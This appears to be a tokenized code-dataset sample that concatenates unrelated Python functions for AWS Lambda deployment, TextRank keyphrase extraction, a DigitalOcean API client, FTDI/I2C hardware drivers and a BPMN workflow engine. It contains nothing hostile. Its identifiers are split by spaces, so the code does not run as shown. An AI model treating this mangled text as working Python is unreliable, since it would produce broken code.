'Variables' : { key : get environment variable value ( value ) for key , value in cfg . get ( 'environment variables' ) . items ( ) } , } , ) client . create function ( * * kwargs ) concurrency = get concurrency ( cfg ) if concurrency > 0 : client . put function concurrency ( Function Name = func name , Reserved Concurrent Executions = concurrency )
def update function ( cfg , path to zip file , existing cfg , use s3 = False , s3 file = None , preserve vpc = False ) : print ( 'Updating your Lambda function' ) byte stream = read ( path to zip file , binary file = True ) profile name = cfg . get ( 'profile' ) aws access key id = cfg . get ( 'aws access key id' ) aws secret access key = cfg . get ( 'aws secret access key' ) account id = get account id ( profile name , aws access key id , aws secret access key , cfg . get ( 'region' , ) , ) role = get role name ( cfg . get ( 'region' ) , account id , cfg . get ( 'role' , 'lambda basic execution' ) , ) client = get client ( 'lambda' , profile name , aws access key id , aws secret access key , cfg . get ( 'region' ) , ) # Do we prefer development variable over config? buck name = ( os . environ . get ( 'S3 BUCKET NAME' ) or cfg . get ( 'bucket name' ) ) if use s3 : client . update function code ( Function Name = cfg . get ( 'function name' ) , S3Bucket = '{}' . format ( buck name ) , S3Key = '{}' . format ( s3 file ) , Publish = True , ) else : client . update function code ( Function Name = cfg . get ( 'function name' ) , Zip File = byte stream , Publish = True , ) kwargs = { 'Function Name' : cfg . get ( 'function name' ) , 'Role' : role , 'Runtime' : cfg . get ( 'runtime' ) , 'Handler' : cfg . get ( 'handler' ) , 'Description' : cfg . get ( 'description' , '' ) , 'Timeout' : cfg . get ( 'timeout' , 15 ) , 'Memory Size' : cfg . get ( 'memory size' , 512 ) , } if preserve vpc : kwargs [ 'Vpc Config' ] = existing cfg . get ( 'Configuration' , { } ) . get ( 'Vpc Config' ) if kwargs [ 'Vpc Config' ] is None : kwargs [ 'Vpc Config' ] = { 'Subnet Ids' : cfg . get ( 'subnet ids' , [ ] ) , 'Security Group Ids' : cfg . get ( 'security group ids' , [ ] ) , } else : del kwargs [ 'Vpc Config' ] [ 'Vpc Id' ] else : kwargs [ 'Vpc Config' ] = { 'Subnet Ids' : cfg . get ( 'subnet ids' , [ ] ) , 'Security Group Ids' : cfg . get ( 'security group ids' , [ ] ) , } if 'environment variables' in cfg : kwargs . update ( Environment = { 'Variables' : { key : str ( get environment variable value ( value ) ) for key , value in cfg . get ( 'environment variables' ) . items ( ) } , } , ) ret = client . update function configuration ( * * kwargs ) concurrency = get concurrency ( cfg ) if concurrency > 0 : client . put function concurrency ( Function Name = cfg . get ( 'function name' ) , Reserved Concurrent Executions = concurrency ) elif 'Concurrency' in existing cfg : client . delete function concurrency ( Function Name = cfg . get ( 'function name' ) ) if 'tags' in cfg : tags = { key : str ( value ) for key , value in cfg . get ( 'tags' ) . items ( ) } if tags != existing cfg . get ( 'Tags' ) : if existing cfg . get ( 'Tags' ) : client . untag resource ( Resource = ret [ 'Function Arn' ] , Tag Keys = list ( existing cfg [ 'Tags' ] . keys ( ) ) ) client . tag resource ( Resource = ret [ 'Function Arn' ] , Tags = tags )
def upload s3 ( cfg , path to zip file , * use s3 ) : print ( 'Uploading your new Lambda function' ) profile name = cfg . get ( 'profile' ) aws access key id = cfg . get ( 'aws access key id' ) aws secret access key = cfg . get ( 'aws secret access key' ) client = get client ( 's3' , profile name , aws access key id , aws secret access key , cfg . get ( 'region' ) , ) byte stream = b'' with open ( path to zip file , mode = 'rb' ) as fh : byte stream = fh . read ( ) s3 key prefix = cfg . get ( 's3 key prefix' , '/dist' ) checksum = hashlib . new ( 'md5' , byte stream ) . hexdigest ( ) timestamp = str ( time . time ( ) ) filename = '{prefix}{checksum}-{ts}.zip' . format ( prefix = s3 key prefix , checksum = checksum , ts = timestamp , ) # Do we prefer development variable over config? buck name = ( os . environ . get ( 'S3 BUCKET NAME' ) or cfg . get ( 'bucket name' ) ) func name = ( os . environ . get ( 'LAMBDA FUNCTION NAME' ) or cfg . get ( 'function name' ) ) kwargs = { 'Bucket' : '{}' . format ( buck name ) , 'Key' : '{}' . format ( filename ) , 'Body' : byte stream , } client . put object ( * * kwargs ) print ( 'Finished uploading {} to S3 bucket {}' . format ( func name , buck name ) ) if use s3 : return filename
def get function config ( cfg ) : function name = cfg . get ( 'function name' ) profile name = cfg . get ( 'profile' ) aws access key id = cfg . get ( 'aws access key id' ) aws secret access key = cfg . get ( 'aws secret access key' ) client = get client ( 'lambda' , profile name , aws access key id , aws secret access key , cfg . get ( 'region' ) , ) try : return client . get function ( Function Name = function name ) except client . exceptions . Resource Not Found Exception as e : if 'Function not found' in str ( e ) : return False
def C Compiler spawn silent ( cmd , dry run = None ) : proc = Popen ( cmd , stdout = PIPE , stderr = PIPE ) out , err = proc . communicate ( ) if proc . returncode : raise Distutils Exec Error ( err )
def iter cython ( path ) : for dir path , dir names , file names in os . walk ( path ) : for file name in file names : if file name . startswith ( '.' ) : continue if os . path . splitext ( file name ) [ 1 ] not in ( '.pyx' , '.pxd' ) : continue yield os . path . join ( dir path , file name )
def split grafs ( lines ) : graf = [ ] for line in lines : line = line . strip ( ) if len ( line ) < 1 : if len ( graf ) > 0 : yield "\n" . join ( graf ) graf = [ ] else : graf . append ( line ) if len ( graf ) > 0 : yield "\n" . join ( graf )
def filter quotes ( text , is email = True ) : global DEBUG global PAT FORWARD , PAT REPLIED , PAT UNSUBSC if is email : text = filter ( lambda x : x in string . printable , text ) if DEBUG : print ( "text:" , text ) # strip off quoted text in a forward m = PAT FORWARD . split ( text , re . M ) if m and len ( m ) > 1 : text = m [ 0 ] # strip off quoted text in a reply m = PAT REPLIED . split ( text , re . M ) if m and len ( m ) > 1 : text = m [ 0 ] # strip off any trailing unsubscription notice m = PAT UNSUBSC . split ( text , re . M ) if m : text = m [ 0 ] # replace any remaining quoted text with blank lines lines = [ ] for line in text . split ( "\n" ) : if line . startswith ( ">" ) : lines . append ( "" ) else : lines . append ( line ) return list ( split grafs ( lines ) )
def fix microsoft ( foo ) : i = 0 bar = [ ] while i < len ( foo ) : text , lemma , pos , tag = foo [ i ] if ( text == "#" ) and ( i > 0 ) : prev tok = bar [ - 1 ] prev tok [ 0 ] += "#" prev tok [ 1 ] += "#" bar [ - 1 ] = prev tok else : bar . append ( foo [ i ] ) i += 1 return bar
def fix hypenation ( foo ) : i = 0 bar = [ ] while i < len ( foo ) : text , lemma , pos , tag = foo [ i ] if ( tag == "HYPH" ) and ( i > 0 ) and ( i < len ( foo ) - 1 ) : prev tok = bar [ - 1 ] next tok = foo [ i + 1 ] prev tok [ 0 ] += "-" + next tok [ 0 ] prev tok [ 1 ] += "-" + next tok [ 1 ] bar [ - 1 ] = prev tok i += 2 else : bar . append ( foo [ i ] ) i += 1 return bar
def parse doc ( json iter ) : global DEBUG for meta in json iter : base idx = 0 for graf text in filter quotes ( meta [ "text" ] , is email = False ) : if DEBUG : print ( "graf text:" , graf text ) grafs , new base idx = parse graf ( meta [ "id" ] , graf text , base idx ) base idx = new base idx for graf in grafs : yield graf
def get tiles ( graf , size = 3 ) : keeps = list ( filter ( lambda w : w . word id > 0 , graf ) ) keeps len = len ( keeps ) for i in iter ( range ( 0 , keeps len - 1 ) ) : w0 = keeps [ i ] for j in iter ( range ( i + 1 , min ( keeps len , i + 1 + size ) ) ) : w1 = keeps [ j ] if ( w1 . idx - w0 . idx ) <= size : yield ( w0 . root , w1 . root , )
def build graph ( json iter ) : global DEBUG , Word Node graph = nx . Di Graph ( ) for meta in json iter : if DEBUG : print ( meta [ "graf" ] ) for pair in get tiles ( map ( Word Node . make , meta [ "graf" ] ) ) : if DEBUG : print ( pair ) for word id in pair : if not graph . has node ( word id ) : graph . add node ( word id ) try : graph . edge [ pair [ 0 ] ] [ pair [ 1 ] ] [ "weight" ] += 1.0 except Key Error : graph . add edge ( pair [ 0 ] , pair [ 1 ] , weight = 1.0 ) return graph
def write dot ( graph , ranks , path = "graph.dot" ) : dot = Digraph ( ) for node in graph . nodes ( ) : dot . node ( node , "%s %0.3f" % ( node , ranks [ node ] ) ) for edge in graph . edges ( ) : dot . edge ( edge [ 0 ] , edge [ 1 ] , constraint = "false" ) with open ( path , 'w' ) as f : f . write ( dot . source )
def render ranks ( graph , ranks , dot file = "graph.dot" ) : if dot file : write dot ( graph , ranks , path = dot file )
def text rank ( path ) : graph = build graph ( json iter ( path ) ) ranks = nx . pagerank ( graph ) return graph , ranks
def find chunk ( phrase , np ) : for i in iter ( range ( 0 , len ( phrase ) ) ) : parsed np = find chunk sub ( phrase , np , i ) if parsed np : return parsed np
def enumerate chunks ( phrase , spacy nlp ) : if ( len ( phrase ) > 1 ) : found = False text = " " . join ( [ rl . text for rl in phrase ] ) doc = spacy nlp ( text . strip ( ) , parse = True ) for np in doc . noun chunks : if np . text != text : found = True yield np . text , find chunk ( phrase , np . text . split ( " " ) ) if not found and all ( [ rl . pos [ 0 ] != "v" for rl in phrase ] ) : yield text , phrase
def collect keyword ( sent , ranks , stopwords ) : for w in sent : if ( w . word id > 0 ) and ( w . root in ranks ) and ( w . pos [ 0 ] in "NV" ) and ( w . root not in stopwords ) : rl = Ranked Lexeme ( text = w . raw . lower ( ) , rank = ranks [ w . root ] / 2.0 , ids = [ w . word id ] , pos = w . pos . lower ( ) , count = 1 ) if DEBUG : print ( rl ) yield rl
def collect entities ( sent , ranks , stopwords , spacy nlp ) : global DEBUG sent text = " " . join ( [ w . raw for w in sent ] ) if DEBUG : print ( "sent:" , sent text ) for ent in spacy nlp ( sent text ) . ents : if DEBUG : print ( "NER:" , ent . label , ent . text ) if ( ent . label not in [ "CARDINAL" ] ) and ( ent . text . lower ( ) not in stopwords ) : w ranks , w ids = find entity ( sent , ranks , ent . text . split ( " " ) , 0 ) if w ranks and w ids : rl = Ranked Lexeme ( text = ent . text . lower ( ) , rank = w ranks , ids = w ids , pos = "np" , count = 1 ) if DEBUG : print ( rl ) yield rl
def collect phrases ( sent , ranks , spacy nlp ) : tail = 0 last idx = sent [ 0 ] . idx - 1 phrase = [ ] while tail < len ( sent ) : w = sent [ tail ] if ( w . word id > 0 ) and ( w . root in ranks ) and ( ( w . idx - last idx ) == 1 ) : # keep collecting... rl = Ranked Lexeme ( text = w . raw . lower ( ) , rank = ranks [ w . root ] , ids = w . word id , pos = w . pos . lower ( ) , count = 1 ) phrase . append ( rl ) else : # just hit a phrase boundary for text , p in enumerate chunks ( phrase , spacy nlp ) : if p : id list = [ rl . ids for rl in p ] rank list = [ rl . rank for rl in p ] np rl = Ranked Lexeme ( text = text , rank = rank list , ids = id list , pos = "np" , count = 1 ) if DEBUG : print ( np rl ) yield np rl phrase = [ ] last idx = w . idx tail += 1
def normalize key phrases ( path , ranks , stopwords = None , spacy nlp = None , skip ner = True ) : global STOPWORDS , SPACY NLP # set up the stop words if ( type ( stopwords ) is list ) or ( type ( stopwords ) is set ) : # explicit conversion to a set, for better performance stopwords = set ( stopwords ) else : if not STOPWORDS : STOPWORDS = load stopwords ( stopwords ) stopwords = STOPWORDS # set up the spa Cy NLP parser if not spacy nlp : if not SPACY NLP : SPACY NLP = spacy . load ( "en" ) spacy nlp = SPACY NLP # collect keyphrases single lex = { } phrase lex = { } if isinstance ( path , str ) : path = json iter ( path ) for meta in path : sent = [ w for w in map ( Word Node . make , meta [ "graf" ] ) ] for rl in collect keyword ( sent , ranks , stopwords ) : id = str ( rl . ids ) if id not in single lex : single lex [ id ] = rl else : prev lex = single lex [ id ] single lex [ id ] = rl . replace ( count = prev lex . count + 1 ) if not skip ner : for rl in collect entities ( sent , ranks , stopwords , spacy nlp ) : id = str ( rl . ids ) if id not in phrase lex : phrase lex [ id ] = rl else : prev lex = phrase lex [ id ] phrase lex [ id ] = rl . replace ( count = prev lex . count + 1 ) for rl in collect phrases ( sent , ranks , spacy nlp ) : id = str ( rl . ids ) if id not in phrase lex : phrase lex [ id ] = rl else : prev lex = phrase lex [ id ] phrase lex [ id ] = rl . replace ( count = prev lex . count + 1 ) # normalize ranks across single keywords and longer phrases: #    * boost the noun phrases based on their length #    * penalize the noun phrases for repeated words rank list = [ rl . rank for rl in single lex . values ( ) ] if len ( rank list ) < 1 : max single rank = 0 else : max single rank = max ( rank list ) repeated roots = { } for rl in sorted ( phrase lex . values ( ) , key = lambda rl : len ( rl ) , reverse = True ) : rank list = [ ] for i in iter ( range ( 0 , len ( rl . ids ) ) ) : id = rl . ids [ i ] if not id in repeated roots : repeated roots [ id ] = 1.0 rank list . append ( rl . rank [ i ] ) else : repeated roots [ id ] += 1.0 rank list . append ( rl . rank [ i ] / repeated roots [ id ] ) phrase rank = calc rms ( rank list ) single lex [ str ( rl . ids ) ] = rl . replace ( rank = phrase rank ) # scale all the ranks together, so they sum to 1.0 sum ranks = sum ( [ rl . rank for rl in single lex . values ( ) ] ) for rl in sorted ( single lex . values ( ) , key = lambda rl : rl . rank , reverse = True ) : if sum ranks > 0.0 : rl = rl . replace ( rank = rl . rank / sum ranks ) elif rl . rank == 0.0 : rl = rl . replace ( rank = 0.1 ) rl = rl . replace ( text = re . sub ( r"\s([\.\,\-\+\:\@])\s" , r"\1" , rl . text ) ) yield rl
def mh digest ( data ) : num perm = 512 m = Min Hash ( num perm ) for d in data : m . update ( d . encode ( 'utf8' ) ) return m
def top sentences ( kernel , path ) : key sent = { } i = 0 if isinstance ( path , str ) : path = json iter ( path ) for meta in path : graf = meta [ "graf" ] tagged sent = [ Word Node . make ( x ) for x in graf ] text = " " . join ( [ w . raw for w in tagged sent ] ) m sent = mh digest ( [ str ( w . word id ) for w in tagged sent ] ) dist = sum ( [ m sent . jaccard ( m ) * rl . rank for rl , m in kernel ] ) key sent [ text ] = ( dist , i ) i += 1 for text , ( dist , i ) in sorted ( key sent . items ( ) , key = lambda x : x [ 1 ] [ 0 ] , reverse = True ) : yield Summary Sent ( dist = dist , idx = i , text = text )
def limit keyphrases ( path , phrase limit = 20 ) : rank thresh = None if isinstance ( path , str ) : lex = [ ] for meta in json iter ( path ) : rl = Ranked Lexeme ( * * meta ) lex . append ( rl ) else : lex = path if len ( lex ) > 0 : rank thresh = statistics . mean ( [ rl . rank for rl in lex ] ) else : rank thresh = 0 used = 0 for rl in lex : if rl . pos [ 0 ] != "v" : if ( used > phrase limit ) or ( rl . rank < rank thresh ) : return used += 1 yield rl . text . replace ( " - " , "-" )
def limit sentences ( path , word limit = 100 ) : word count = 0 if isinstance ( path , str ) : path = json iter ( path ) for meta in path : if not isinstance ( meta , Summary Sent ) : p = Summary Sent ( * * meta ) else : p = meta sent text = p . text . strip ( ) . split ( " " ) sent len = len ( sent text ) if ( word count + sent len ) > word limit : break else : word count += sent len yield sent text , p . idx
def make sentence ( sent text ) : lex = [ ] idx = 0 for word in sent text : if len ( word ) > 0 : if ( idx > 0 ) and not ( word [ 0 ] in ",.:;!?-\"'" ) : lex . append ( " " ) lex . append ( word ) idx += 1 return "" . join ( lex )
def json iter ( path ) : with open ( path , 'r' ) as f : for line in f . readlines ( ) : yield json . loads ( line )
def pretty print ( obj , indent = False ) : if indent : return json . dumps ( obj , sort keys = True , indent = 2 , separators = ( ',' , ': ' ) ) else : return json . dumps ( obj , sort keys = True )
def get object ( cls , api token , snapshot id ) : snapshot = cls ( token = api token , id = snapshot id ) snapshot . load ( ) return snapshot
def load ( self ) : tags = self . get data ( "tags/%s" % self . name ) tag = tags [ 'tag' ] for attr in tag . keys ( ) : setattr ( self , attr , tag [ attr ] ) return self
def create ( self , * * kwargs ) : for attr in kwargs . keys ( ) : setattr ( self , attr , kwargs [ attr ] ) params = { "name" : self . name } output = self . get data ( "tags" , type = "POST" , params = params ) if output : self . name = output [ 'tag' ] [ 'name' ] self . resources = output [ 'tag' ] [ 'resources' ]
def get object ( cls , api token , action id ) : action = cls ( token = api token , id = action id ) action . load directly ( ) return action
def get data ( self , * args , * * kwargs ) : data = super ( Droplet , self ) . get data ( * args , * * kwargs ) if "type" in kwargs : if kwargs [ "type" ] == POST : self . check actions in data ( data ) return data
def get kernel available ( self ) : kernels = list ( ) data = self . get data ( "droplets/%s/kernels/" % self . id ) while True : for jsond in data [ u'kernels' ] : kernel = Kernel ( * * jsond ) kernel . token = self . token kernels . append ( kernel ) try : url = data [ u'links' ] [ u'pages' ] . get ( u'next' ) if not url : break data = self . get data ( url ) except Key Error : # No links. break return kernels
def get object ( cls , api token , domain name ) : domain = cls ( token = api token , name = domain name ) domain . load ( ) return domain
def get records ( self , params = None ) : if params is None : params = { } # URL https://api.digitalocean.com/v2/domains/[NAME]/records/ records = [ ] data = self . get data ( "domains/%s/records/" % self . name , type = GET , params = params ) for record data in data [ 'domain records' ] : record = Record ( domain name = self . name , * * record data ) record . token = self . token records . append ( record ) return records
def get object ( cls , api token ) : acct = cls ( token = api token ) acct . load ( ) return acct
def get object ( cls , api token , firewall id ) : firewall = cls ( token = api token , id = firewall id ) firewall . load ( ) return firewall
def add tags ( self , tags ) : return self . get data ( "firewalls/%s/tags" % self . id , type = POST , params = { "tags" : tags } )
def remove tags ( self , tags ) : return self . get data ( "firewalls/%s/tags" % self . id , type = DELETE , params = { "tags" : tags } )
def get object ( cls , api token , ssh key id ) : ssh key = cls ( token = api token , id = ssh key id ) ssh key . load ( ) return ssh key
def create ( self ) : input params = { "name" : self . name , "public key" : self . public key , } data = self . get data ( "account/keys/" , type = POST , params = input params ) if data : self . id = data [ 'ssh key' ] [ 'id' ]
def edit ( self ) : input params = { "name" : self . name , "public key" : self . public key , } data = self . get data ( "account/keys/%s" % self . id , type = PUT , params = input params ) if data : self . id = data [ 'ssh key' ] [ 'id' ]
def get all regions ( self ) : data = self . get data ( "regions/" ) regions = list ( ) for jsoned in data [ 'regions' ] : region = Region ( * * jsoned ) region . token = self . token regions . append ( region ) return regions
def get all droplets ( self , tag name = None ) : params = dict ( ) if tag name : params [ "tag name" ] = tag name data = self . get data ( "droplets/" , params = params ) droplets = list ( ) for jsoned in data [ 'droplets' ] : droplet = Droplet ( * * jsoned ) droplet . token = self . token for net in droplet . networks [ 'v4' ] : if net [ 'type' ] == 'private' : droplet . private ip address = net [ 'ip address' ] if net [ 'type' ] == 'public' : droplet . ip address = net [ 'ip address' ] if droplet . networks [ 'v6' ] : droplet . ip v6 address = droplet . networks [ 'v6' ] [ 0 ] [ 'ip address' ] if "backups" in droplet . features : droplet . backups = True else : droplet . backups = False if "ipv6" in droplet . features : droplet . ipv6 = True else : droplet . ipv6 = False if "private networking" in droplet . features : droplet . private networking = True else : droplet . private networking = False droplets . append ( droplet ) return droplets
def get droplet ( self , droplet id ) : return Droplet . get object ( api token = self . token , droplet id = droplet id )
def get all sizes ( self ) : data = self . get data ( "sizes/" ) sizes = list ( ) for jsoned in data [ 'sizes' ] : size = Size ( * * jsoned ) size . token = self . token sizes . append ( size ) return sizes
def get images ( self , private = False , type = None ) : params = { } if private : params [ 'private' ] = 'true' if type : params [ 'type' ] = type data = self . get data ( "images/" , params = params ) images = list ( ) for jsoned in data [ 'images' ] : image = Image ( * * jsoned ) image . token = self . token images . append ( image ) return images
def get all domains ( self ) : data = self . get data ( "domains/" ) domains = list ( ) for jsoned in data [ 'domains' ] : domain = Domain ( * * jsoned ) domain . token = self . token domains . append ( domain ) return domains
def get domain ( self , domain name ) : return Domain . get object ( api token = self . token , domain name = domain name )
def get all sshkeys ( self ) : data = self . get data ( "account/keys/" ) ssh keys = list ( ) for jsoned in data [ 'ssh keys' ] : ssh key = SSH Key ( * * jsoned ) ssh key . token = self . token ssh keys . append ( ssh key ) return ssh keys
def get ssh key ( self , ssh key id ) : return SSH Key . get object ( api token = self . token , ssh key id = ssh key id )
def get all tags ( self ) : data = self . get data ( "tags" ) return [ Tag ( token = self . token , * * tag ) for tag in data [ 'tags' ] ]
def get all floating ips ( self ) : data = self . get data ( "floating ips" ) floating ips = list ( ) for jsoned in data [ 'floating ips' ] : floating ip = Floating IP ( * * jsoned ) floating ip . token = self . token floating ips . append ( floating ip ) return floating ips
def get floating ip ( self , ip ) : return Floating IP . get object ( api token = self . token , ip = ip )
def get all load balancers ( self ) : data = self . get data ( "load balancers" ) load balancers = list ( ) for jsoned in data [ 'load balancers' ] : load balancer = Load Balancer ( * * jsoned ) load balancer . token = self . token load balancer . health check = Health Check ( * * jsoned [ 'health check' ] ) load balancer . sticky sessions = Sticky Sesions ( * * jsoned [ 'sticky sessions' ] ) forwarding rules = list ( ) for rule in jsoned [ 'forwarding rules' ] : forwarding rules . append ( Forwarding Rule ( * * rule ) ) load balancer . forwarding rules = forwarding rules load balancers . append ( load balancer ) return load balancers
def get all certificates ( self ) : data = self . get data ( "certificates" ) certificates = list ( ) for jsoned in data [ 'certificates' ] : cert = Certificate ( * * jsoned ) cert . token = self . token certificates . append ( cert ) return certificates
def get snapshot ( self , snapshot id ) : return Snapshot . get object ( api token = self . token , snapshot id = snapshot id )
def get all snapshots ( self ) : data = self . get data ( "snapshots/" ) return [ Snapshot ( token = self . token , * * snapshot ) for snapshot in data [ 'snapshots' ] ]
def get droplet snapshots ( self ) : data = self . get data ( "snapshots?resource type=droplet" ) return [ Snapshot ( token = self . token , * * snapshot ) for snapshot in data [ 'snapshots' ] ]
def get volume snapshots ( self ) : data = self . get data ( "snapshots?resource type=volume" ) return [ Snapshot ( token = self . token , * * snapshot ) for snapshot in data [ 'snapshots' ] ]
def get all volumes ( self , region = None ) : if region : url = "volumes?region={}" . format ( region ) else : url = "volumes" data = self . get data ( url ) volumes = list ( ) for jsoned in data [ 'volumes' ] : volume = Volume ( * * jsoned ) volume . token = self . token volumes . append ( volume ) return volumes
def get volume ( self , volume id ) : return Volume . get object ( api token = self . token , volume id = volume id )
def get all firewalls ( self ) : data = self . get data ( "firewalls" ) firewalls = list ( ) for jsoned in data [ 'firewalls' ] : firewall = Firewall ( * * jsoned ) firewall . token = self . token in rules = list ( ) for rule in jsoned [ 'inbound rules' ] : in rules . append ( Inbound Rule ( * * rule ) ) firewall . inbound rules = in rules out rules = list ( ) for rule in jsoned [ 'outbound rules' ] : out rules . append ( Outbound Rule ( * * rule ) ) firewall . outbound rules = out rules firewalls . append ( firewall ) return firewalls
def get firewall ( self , firewall id ) : return Firewall . get object ( api token = self . token , firewall id = firewall id , )
def get object ( cls , api token , domain , record id ) : record = cls ( token = api token , domain = domain , id = record id ) record . load ( ) return record
def get object ( cls , api token , volume id ) : volume = cls ( token = api token , id = volume id ) volume . load ( ) return volume
def get object ( cls , api token , cert id ) : certificate = cls ( token = api token , id = cert id ) certificate . load ( ) return certificate
def stop ( self , pin ) : if pin not in self . pwm : raise Value Error ( 'Pin {0} is not configured as a PWM.  Make sure to first call start for the pin.' . format ( pin ) ) self . pwm [ pin ] . stop ( ) del self . pwm [ pin ]
def enable FTDI driver ( ) : logger . debug ( 'Enabling FTDI driver.' ) if sys . platform == 'darwin' : logger . debug ( 'Detected Mac OSX' ) # Mac OS commands to enable FTDI driver. check running as root ( ) subprocess . check call ( 'kextload -b com.apple.driver.Apple USBFTDI' , shell = True ) subprocess . check call ( 'kextload /System/Library/Extensions/FTDIUSB Serial Driver.kext' , shell = True ) elif sys . platform . startswith ( 'linux' ) : logger . debug ( 'Detected Linux' ) # Linux commands to enable FTDI driver. check running as root ( ) subprocess . check call ( 'modprobe -q ftdi sio' , shell = True ) subprocess . check call ( 'modprobe -q usbserial' , shell = True )
def close ( self ) : if self . ctx is not None : ftdi . free ( self . ctx ) self . ctx = None
def mpsse enable ( self ) : # Reset MPSSE by sending mask = 0 and mode = 0 self . check ( ftdi . set bitmode , 0 , 0 ) # Enable MPSSE by sending mask = 0 and mode = 2 self . check ( ftdi . set bitmode , 0 , 2 )
def idle ( self ) : # Put the I2C lines into an idle state with SCL and SDA high. self . ft232h . setup pins ( { 0 : GPIO . OUT , 1 : GPIO . OUT , 2 : GPIO . IN } , { 0 : GPIO . HIGH , 1 : GPIO . HIGH } )
def transaction end ( self ) : # Ask to return response bytes immediately. self . command . append ( '\x87' ) # Send the entire command to the MPSSE. self . ft232h . write ( '' . join ( self . command ) ) # Read response bytes and return them. return bytearray ( self . ft232h . poll read ( self . expected ) )
def i2c write bytes ( self , data ) : for byte in data : # Write byte. self . command . append ( str ( bytearray ( ( 0x11 , 0x00 , 0x00 , byte ) ) ) ) # Make sure pins are back in idle state with clock low and data high. self . ft232h . output pins ( { 0 : GPIO . LOW , 1 : GPIO . HIGH } , write = False ) self . command . append ( self . ft232h . mpsse gpio ( ) * REPEAT DELAY ) # Read bit for ACK/NAK. self . command . append ( '\x22\x00' ) # Increase expected response bytes. self . expected += len ( data )
def write16 ( self , register , value , little endian = True ) : value = value & 0x FFFF value low = value & 0x FF value high = ( value >> 8 ) & 0x FF if not little endian : value low , value high = value high , value low self . idle ( ) self . transaction start ( ) self . i2c start ( ) self . i2c write bytes ( [ self . address byte ( False ) , register , value low , value high ] ) self . i2c stop ( ) response = self . transaction end ( ) self . verify acks ( response )
def write List ( self , register , data ) : self . idle ( ) self . transaction start ( ) self . i2c start ( ) self . i2c write bytes ( [ self . address byte ( False ) , register ] + data ) self . i2c stop ( ) response = self . transaction end ( ) self . verify acks ( response )
def read S8 ( self , register ) : result = self . read U8 ( register ) if result > 127 : result -= 256 return result
def write8 ( self , register , value ) : value = value & 0x FF self . bus . write byte data ( self . address , register , value ) self . logger . debug ( "Wrote 0x%02X to register 0x%02X" , value , register )
def write16 ( self , register , value ) : value = value & 0x FFFF self . bus . write word data ( self . address , register , value ) self . logger . debug ( "Wrote 0x%04X to register pair 0x%02X, 0x%02X" , value , register , register + 1 )
def write List ( self , register , data ) : self . bus . write i2c block data ( self . address , register , data ) self . logger . debug ( "Wrote to register 0x%02X: %s" , register , data )
def read U8 ( self , register ) : result = self . bus . read byte data ( self . address , register ) & 0x FF self . logger . debug ( "Read 0x%02X from register 0x%02X" , result , register ) return result
def all info files ( self ) : try : for info file in list files in dir ( self . info dir ) : if not os . path . basename ( info file ) . endswith ( '.trashinfo' ) : self . on non trashinfo found ( ) else : yield info file except OS Error : # when directory does not exist pass
def add bpmn files ( self , filenames ) : for filename in filenames : f = open ( filename , 'r' ) try : self . add bpmn xml ( ET . parse ( f ) , filename = filename ) finally : f . close ( )
def one ( nodes , or none = False ) : if not nodes and or none : return None assert len ( nodes ) == 1 , 'Expected 1 result. Received %d results.' % ( len ( nodes ) ) return nodes [ 0 ]
def get event definition ( self ) : message Event Definition = first ( self . xpath ( './/bpmn:message Event Definition' ) ) if message Event Definition is not None : return self . get message event definition ( message Event Definition ) timer Event Definition = first ( self . xpath ( './/bpmn:timer Event Definition' ) ) if timer Event Definition is not None : return self . get timer event definition ( timer Event Definition ) raise Not Implemented Error ( 'Unsupported Intermediate Catch Event: %r' , ET . tostring ( self . node ) )
def parse node ( self ) : try : self . task = self . create task ( ) self . task . documentation = self . parser . parse documentation ( self . node , xpath = self . xpath , task parser = self ) boundary event nodes = self . process xpath ( './/bpmn:boundary Event[@attached To Ref="%s"]' % self . get id ( ) ) if boundary event nodes : parent task = Boundary Event Parent ( self . spec , '%s.Boundary Event Parent' % self . get id ( ) , self . task , lane = self . task . lane ) self . process parser . parsed nodes [ self . node . get ( 'id' ) ] = parent task parent task . connect outgoing ( self . task , '%s.From Boundary Event Parent' % self . get id ( ) , None , None ) for boundary event in boundary event nodes : b = self . process parser . parse node ( boundary event ) parent task . connect outgoing ( b , '%s.From Boundary Event Parent' % boundary event . get ( 'id' ) , None , None ) else : self . process parser . parsed nodes [ self . node . get ( 'id' ) ] = self . task children = [ ] outgoing = self . process xpath ( './/bpmn:sequence Flow[@source Ref="%s"]' % self . get id ( ) ) if len ( outgoing ) > 1 and not self . handles multiple outgoing ( ) : raise Validation Exception ( 'Multiple outgoing flows are not supported for ' 'tasks of type' , node = self . node , filename = self . process parser . filename ) for sequence flow in outgoing : target ref = sequence flow . get ( 'target Ref' ) target node = one ( self . process xpath ( './/*[@id="%s"]' % target ref ) ) c = self . process parser . parse node ( target node ) children . append ( ( c , target node , sequence flow ) ) if children : default outgoing = self . node . get ( 'default' ) if not default outgoing : ( c , target node , sequence flow ) = children [ 0 ] default outgoing = sequence flow . get ( 'id' ) for ( c , target node , sequence flow ) in children : self . connect outgoing ( c , target node , sequence flow , sequence flow . get ( 'id' ) == default outgoing ) return parent task if boundary event nodes else self . task except Validation Exception : raise except Exception as ex : exc info = sys . exc info ( ) tb = "" . join ( traceback . format exception ( exc info [ 0 ] , exc info [ 1 ] , exc info [ 2 ] ) ) LOG . error ( "%r\n%s" , ex , tb ) raise Validation Exception ( "%r" % ( ex ) , node = self . node , filename = self . process parser . filename )
def get outgoing sequence names ( self ) : return sorted ( [ s . name for s in list ( self . outgoing sequence flows by id . values ( ) ) ] )
def start ( self , my task , force = False ) : if ( not hasattr ( my task , 'subprocess' ) ) or my task . subprocess is None : my task . subprocess = subprocess . Popen ( self . args , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) if my task . subprocess : my task . subprocess . poll ( ) if my task . subprocess . returncode is None : # Still waiting return False else : results = my task . subprocess . communicate ( ) my task . results = results return True return False
def ready ( self ) : if self . has state ( self . COMPLETED ) or self . has state ( self . CANCELLED ) : return self . set state ( self . READY ) self . task spec . on ready ( self )
def get state name ( self ) : state name = [ ] for state , name in list ( self . state names . items ( ) ) : if self . has state ( state ) : state name . append ( name ) return '|' . join ( state name )
def inherit data ( self ) : LOG . debug ( "'%s' inheriting data from '%s'" % ( self . get name ( ) , self . parent . get name ( ) ) , extra = dict ( data = self . parent . data ) ) self . set data ( * * self . parent . data )
def eval args ( args , my task ) : results = [ ] for arg in args : if isinstance ( arg , Attrib ) or isinstance ( arg , Path Attrib ) : results . append ( valueof ( my task , arg ) ) else : results . append ( arg ) return results
